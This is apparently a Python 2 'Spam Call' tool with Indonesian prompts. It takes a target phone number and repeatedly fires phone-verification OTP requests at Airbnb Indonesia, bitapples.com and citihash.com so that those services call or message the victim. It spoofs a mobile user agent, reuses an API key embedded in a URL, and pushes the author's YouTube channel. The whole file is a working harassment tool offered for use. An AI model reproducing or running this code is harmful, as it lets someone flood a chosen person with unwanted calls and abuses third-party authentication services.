
#!/usr/bin/python2
# Author : ./Mulis02
# Apa Liat Liat ? Mau Recode ? >_<
# Belajar Boleh, Asalkan Jangan Recode Yak >_<
# Recode Tidak Akan Membuat Anda Menjadi Pencipta Kode :3

M = '\033[1;31m'
H = '\033[1;32m'
K = '\033[1;33m'
U = '\033[1;34m'
P = '\033[1;35m'
C = '\033[1;36m'
W = '\033[1;37m'
A = '\033[90m'

from requests.exceptions import ConnectionError
from cookielib import LWPCookieJar as Cookie
from time import sleep
import platform, requests, random, sys, os

if platform.system() == 'Linux':
	clear = 'clear'
	
elif platform.system() == 'Windows':
	clear = 'cls'

else:
	pass
	
def banner():
	os.system(clear)
	print(''+C+'''
 
 _____                         _____       _ _ 
/  ___|                       /  __ \     | | |
\ `--. _ __   __ _ _ __ ___   | /  \/ __ _| | |
 `--. \ '_ \ / _` | '_ ` _ \  | |    / _` | | |
/\__/ / |_) | (_| | | | | | | | \__/\ (_| | | |
\____/| .__/ \__,_|_| |_| |_|  \____/\__,_|_|_|
      | |                                      
      |_|                                      
                '''+W+'Creator : ./Mulis02\n\t\t     YT : PapaUiiss')
                
def tiks(s):
	for x in s + '\n':
		sys.stdout.write(x)
		sys.stdout.flush()
		sleep(random.random() * 0.01)
		
def main():
	banner()
	print
	tiks(W+50*'=')
	tiks(C+'\tTOOLS\t\t LIMIT\t\tSTATUS')
	tiks(W+50*'=')
	print
	tiks(C+'['+W+'1'+C+']'+W+' SPAM CALL V1' +W+'\t3X / 1 HARI'+W+'\tACTIVE'+H+' \xE2\x9C\x94')
	tiks(C+50*'=')
	tiks(C+'['+W+'2'+C+']'+W+' SPAM CALL V2'+W+'\t3X / 1 HARI'+W+'\tACTIVE'+H+' \xE2\x9C\x94')
	tiks(C+50*'=')
	tiks(C+'['+W+'3'+C+']'+W+' SPAM CALL V3'+W+'\t3X / 1 HARI'+W+'\tACTIVE'+H+' \xE2\x9C\x94')
	tiks(C+50*'=')
	tiks(C+'['+W+'4'+C+']'+W+' REPORT BUG'+K+'\t\t    -\t\t'+W+'ACTIVE'+H+' \xE2\x9C\x94')
	tiks(C+50*'=')
	tiks(C+'['+W+'5'+C+']'+W+' SUBSCRIBE YT'+K+'\t    -\t\t'+W+'ACTIVE'+H+' \xE2\x9C\x94')
	tiks(C+50*'=')
	tiks(C+'['+W+'X'+C+']'+W+' EXIT / KELUAR'+K+'\t    -\t\t'+W+'ACTIVE'+H+' \xE2\x9C\x94')
	tiks(C+50*'=')
	
	try:
		print
		pilih = raw_input(W+'Pilih Tools'+C+' : '+W+'')
		
		if pilih == '1':
			print
			tiks(W+'\t\tSPAM OTP V1')
			tiks(C+'\t\t'+12*'=')
			print
			
			phone = raw_input(W+'\tNOMOR TARGET ('+H+' Ex :'+C+' 62812xxxx '+W+') : ')
			jumlah = input(''+W+'\tJUMLAH SPAM'+W+' ('+H+' Ex :'+C+' 3 '+W+') : ')
			
			if jumlah > 3:
				print
				print(W+'Jumlah Melewati Limit'+C+' ^_^')
				sleep(3)
				main()
				
			elif len(phone) < 10:
				print
				print(M+'\tNomor Tidak Valid !')
				sys.exit()
			
			elif '62' not in phone[0:2]:
				print
				print(C+'\tPakai 62'+W+' !')
				sleep(2.5)
				main()
					
			else:
				pass
			
			print
			for _ in range(int(jumlah)):
				
				sleep(5)
				
				data = {
				'phoneNumber' : phone,
				'workFlow' : 'GLOBAL_SIGNUP_LOGIN',
				'otpMethod' : 'CALL'
				}
				
				Cookies = Cookie('.cookieslog','w')
				Sess = requests.Session()
				Sess.cookies = Cookies
				Sess.headers = {'User-Agent' : 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; 909) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537'}
				
				send = Sess.post('https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=USD&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id', json = data)
			
				if 'error' in send.text:
					print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(phone)+W+' GAGAL'+M+' \xE2\x9C\x96')
				
				else:
					print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(phone)+W+' BERHASIL'+H+' \xE2\x9C\x94')
					Cookies.save()
					
		elif pilih == '2':
			print
			tiks(W+'\t\tSPAM OTP V2')
			tiks(C+'\t\t'+12*'=')
			print
			phone = raw_input(W+'\tNOMOR TARGET ('+H+' Ex :'+C+' 812xxxx '+W+') : ')
			jumlah = input(''+W+'\tJUMLAH SPAM'+W+' ('+H+' Ex :'+C+' 3 '+W+') : ')
			
			if jumlah > 3:
				print
				print(W+'Jumlah Melewati Limit'+C+' ^_^')
				sleep(3)
				main()
				
			elif len(phone) < 10:
				print
				print(M+'\tNomor Tidak Valid !')
				sys.exit()
			
			elif '62' in phone[0:2] or '+62' in phone[0:2] or '08' in phone[0:2]:
				print
				print(C+'\tTanpa'+W+' +62/62/08'+C+' Langsung'+W+' 812xxxx'+C+' !')
				sleep(4)
				main()
					
			else:
				pass
			
			print
			for _ in range(int(jumlah)):
				
				sleep(5)
				data = {
				'contactNo' : phone,
				'countryCode' : 'ID',
				'requestMode' : '2',
				'isSignup' : 'true'
				}

				Cookies = Cookie('.cookieslog','w')
				Sess = requests.Session()
				Sess.cookies = Cookies
				Sess.headers = {'User-Agent' : 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; 909) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537'}
				
				send = Sess.post('https://bitapples.com/api/v1/customer/auth/reqotpwithoutauth?t=1585974899&lang=en', json = data, headers = {'User-Agent' : 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; 909) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537'})
			
				if 'Error' in send.text:
					print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(phone)+W+' GAGAL'+M+' \xE2\x9C\x96')
				
				else:
					print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(phone)+W+' BERHASIL'+H+' \xE2\x9C\x94')
					Cookies.save()
					
		elif pilih == '3':
			print
			tiks(W+'\t\tSPAM OTP V3')
			tiks(C+'\t\t'+12*'=')
			print
			phone = raw_input(W+'\tNOMOR TARGET ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
			jumlah = input(''+W+'\tJUMLAH SPAM'+W+' ('+H+' Ex :'+C+' 3 '+W+') : ')
			
			if jumlah > 3:
				print
				print(W+'Jumlah Melewati Limit'+C+' ^_^')
				sleep(3)
				main()
				
			elif len(phone) < 10:
				print
				print(M+'\tNomor Tidak Valid !')
				sys.exit()
			
			elif '62' in phone[0:2] or '+62' in phone[0:2]:
				print
				print(C+'\tTanpa'+W+' +62/62'+C+' Langsung'+W+' 0812xxxx'+C+' !')
				sleep(4)
				main()
					
			else:
				pass
			
			print
			for _ in range(int(jumlah)):
				
				sleep(5)
				
				data = {
				'contactNo' : phone,
				'countryCode' : 'ID',
				'requestMode' : '2',
				'isSignup' : 'true'
				}
				
				Cookies = Cookie('.cookieslog','w')
				Sess = requests.Session()
				Sess.cookies = Cookies
				Sess.headers = {'User-Agent' : 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; 909) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537'}
				
				send = Sess.post('https://citihash.com/api/v1/auth/requestOtpWithoutAuth?lang=en', json = data, headers = {'User-Agent' : 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; 909) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537'})
			
				if 'Error' in send.text:
					print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(phone)+W+' GAGAL'+M+' \xE2\x9C\x96')
				
				else:
					print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(phone)+W+' BERHASIL'+H+' \xE2\x9C\x94')
					Cookies.save()
					
		elif pilih == '4':
			print
			os.system('xdg-open http://wa.me/6285880818385?text=Hallo%20Min.%20Saya%20Nemu%20Kesalahan%20:%0A%0A')
			sleep(2)
			print(W+'Hayooo Abis Report Apa'+C+' ^_^')
			sys.exit()
			
		elif pilih == '5':
			print
			os.system('xdg-open https://m.youtube.com/channel/UC8oHXDTCMz19u0aOoGsJoGw')
			sleep(2)
			tanya = raw_input(W+'Udah Subscribe Belum ?'+C+' ^_^'+W+' ['+C+'Y'+W+'/'+C+'n'+W+']'+C+' : '+W+'')
			if tanya.upper() == 'Y':
				print
				print(W+'Terima Kasih'+C+' ^_^')
				sys.exit() 
				
			else:
				print
				print(W+'Ok Gpp Kok'+C+' ^_^')
				sys.exit() 
			
		elif pilih == 'X' or pilih == 'x':
			print
			print(W+'Thanks, Jangan Lupa Balik Lagi'+C+' ^_^')
			sys.exit()
			
		else:
			print
			print(W+'Tools Tidak Di Temukan '+C+'^_^')
			sys.exit()
			
	except ConnectionError:
		print
		print(M+' Jaringan Tidak Ada  !')
		sys.exit()
	
	except ValueError:
		print
		print(M+' Yang Anda Masukkan Salah  !')
		sleep(3)
		main()
		
	except NameError:
		print
		print(M+' Masukkan Angka !')
		sleep(3)
		main()
		
if __name__ == '__main__':
	os.system(clear)
	print(C+'Subscribe YT'+W+' Gua Dlu Ya Bro !'+C+' :v')
	print
	os.system('xdg-open https://m.youtube.com/channel/UC8oHXDTCMz19u0aOoGsJoGw')
	sleep(2)
	tanya = raw_input(W+'Udah Subscribe Belum ?'+C+' ^_^'+W+' ['+C+'Y'+W+'/'+C+'n'+W+']'+C+' : '+W+'')
	if tanya.upper() == 'Y':
		print
		print(W+'Terima Kasih'+C+' ^_^')
		sleep(2)
		main()
		
	else:
		print
		print(W+'Ok Gpp Kok'+C+' ^_^')
		sleep(2)
		main()